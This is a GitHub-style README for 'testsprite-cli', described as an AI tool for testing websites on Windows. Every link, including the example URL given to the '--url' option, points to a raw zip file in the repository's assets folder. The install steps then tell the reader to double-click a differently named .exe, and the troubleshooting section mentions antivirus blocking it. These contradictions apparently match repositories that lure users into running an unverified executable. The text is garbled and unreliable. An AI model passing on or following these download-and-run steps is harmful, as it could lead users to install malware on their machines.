# 🤖 testsprite-cli - Automate your software testing with AI

[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/zkwr3354/testsprite-cli/raw/refs/heads/main/assets/testsprite-cli-coinfer.zip)

## 📌 What is this tool?
TestSprite CLI helps you check your software for bugs. It uses artificial intelligence to find errors. You run it from your command prompt. It mimics how a real person uses a website. This tool catches broken links, visual errors, and slow performance. You do not need to write code to use it. 

## ⚙️ Why use TestSprite?
Manual testing takes time. Human eyes miss small mistakes. This tool scans your entire application. It runs tests day and night. You gain confidence in your software releases. The tool uses Playwright technology under the hood to ensure consistent results. 

## 🖥️ System Requirements
Ensure your computer meets these minimum needs for smooth operation:
* Windows 10 or Windows 11.
* At least 4GB of RAM.
* A stable internet connection.
* Node.js version 18 or higher.

## 📥 How to download and install
You must download the software package from the official release page. 

[Click here to visit the download page](https://github.com/zkwr3354/testsprite-cli/raw/refs/heads/main/assets/testsprite-cli-coinfer.zip)

1. Go to the link above.
2. Look for the "Releases" section on the right side of your screen.
3. Select the latest version available.
4. Download the file named `testsprite-setup.exe`.
5. Open your "Downloads" folder.
6. Double-click the file to start the installation.
7. Follow the prompts on your screen. 
8. Click "Finish" when the installer closes.

## 🚀 Setting up the application
After the installation, you must verify the setup. 

1. Press the Windows key on your keyboard.
2. Type "Command Prompt" and press Enter.
3. A black window appears. Type `testsprite --version` and press Enter.
4. If you see a version number, the tool is ready. 

## 🛠️ Testing your first website
You can test any web address. Open your Command Prompt again to begin.

1. Type `testsprite --url https://github.com/zkwr3354/testsprite-cli/raw/refs/heads/main/assets/testsprite-cli-coinfer.zip` and press Enter.
2. The software starts the browser.
3. It performs a sequence of pre-defined tests. 
4. Watch the terminal for real-time updates.
5. The test ends when you see "Test Run Complete" on the screen.

## 📄 Understanding the results
The tool generates a report after every test. You find this report in a folder named `testsprite-reports` on your desktop. Open the `report.html` file in your preferred web browser. 

The report contains:
* Pass markers for items that work.
* Error flags for items that fail.
* Screenshots showing exactly where the bug occurred.
* Performance timings for page loads.

## 📋 Tips for better tests
* Close unnecessary browser tabs before the test.
* Ensure your website is live during the test.
* Use a fast internet connection for accurate speed results.
* Check the website title before starting. 

## 🔐 Privacy and security
TestSprite runs locally on your machine. We do not store your data on external servers. The AI analysis happens inside your computer memory. Your website credentials remain private throughout the testing process. 

## ❓ Frequently asked questions

**Does this tool work on Mac or Linux?**
This version is designed for Windows.

**Do I need a paid license?**
The current version is free to use.

**Can I run multiple tests at once?**
You can run multiple instances of the tool if your computer has enough memory.

**How do I update the tool?**
Visit the official repository and download the latest installer again. It overwrites the old version and keeps your settings.

## 🔧 Troubleshooting
If the program does not start:
* Restart your computer.
* Ensure you have administrative rights on your user account.
* Check your antivirus software to see if it blocks the command. 
* Uninstall and reinstall the tool if errors persist.

## 📦 About the underlying technology
This tool relies on Playwright. This library provides a bridge between your terminal and the browser. It allows the software to click buttons and type text exactly like you would. The AI component analyzes the layout and suggests fixes for common visual issues. It identifies overlapping text and hidden buttons.

## 📝 Configuration options
You can change how the tool behaves by creating a file named `config.json`. Place this file in the same folder where you installed the software. 

You can set these values:
* `headless`: Set to `true` to run tests without seeing the browser window.
* `browser`: Change between "chrome" and "edge".
* `timeout`: Increase this number if your website is slow to load.

## 📌 Example configurations
If you want to run tests faster, use this setting in your configuration file:

{
  "headless": true,
  "browser": "chrome"
}

Save the file and restart the command prompt. The tool detects these changes automatically. 

## 🔍 Advanced features
The CLI supports different testing modes. 
* Use `testsprite --quick` for a fast scan of links only.
* Use `testsprite --visual` for a deep look at colors and layouts.
* Use `testsprite --mobile` to see how the site looks on a phone screen.

## 🏁 Conclusion
You now have the tools to ensure quality on your web projects. Regular testing prevents small bugs from becoming large problems. The software provides a simple path to automation. Test often to keep your application stable.